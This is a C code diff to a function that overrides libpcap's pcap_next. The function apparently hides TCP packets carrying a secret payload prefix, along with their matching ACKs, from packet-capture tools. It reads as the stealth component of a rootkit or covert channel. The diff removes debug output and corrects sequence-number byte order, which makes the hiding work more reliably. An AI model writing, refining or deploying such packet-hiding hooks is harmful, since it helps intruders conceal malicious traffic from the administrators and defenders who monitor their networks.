@@ -55,10 +55,9 @@ const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
 
     if (likely(tcp_hdr->ack))
     {
-
-        printf("Looking for %u->%u: %u\n", src_port, dst_port, ack_seq);
-        if ((should_hide = is_ack_kept(ack_ds_handle, src_port, dst_port, ack_seq)))
+        if (is_ack_kept(ack_ds_handle, src_port, dst_port, ack_seq))
         {
+            should_hide = 1;
             remove_ack(&ack_ds_handle, src_port, dst_port, ack_seq);
         }
     }
@@ -68,10 +67,10 @@ const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
 
 
     payload_len = packet + h->len - payload;
-    if ((should_hide = (payload_len && strncmp((char *)payload, secret_prefix, sizeof(secret_prefix) - 1) == 0)))
+    if (payload_len && strncmp((char *)payload, secret_prefix, sizeof(secret_prefix) - 1) == 0)
     {
-        add_ack(&ack_ds_handle, dst_port, src_port, tcp_hdr->seq + payload_len);
-        printf("Added HEAD %u->%u: %u\n", dst_port, src_port, ntohl(tcp_hdr->seq) + payload_len);
+        should_hide = 1;
+        add_ack(&ack_ds_handle, dst_port, src_port, ntohl(tcp_hdr->seq) + payload_len);
     }
 
 
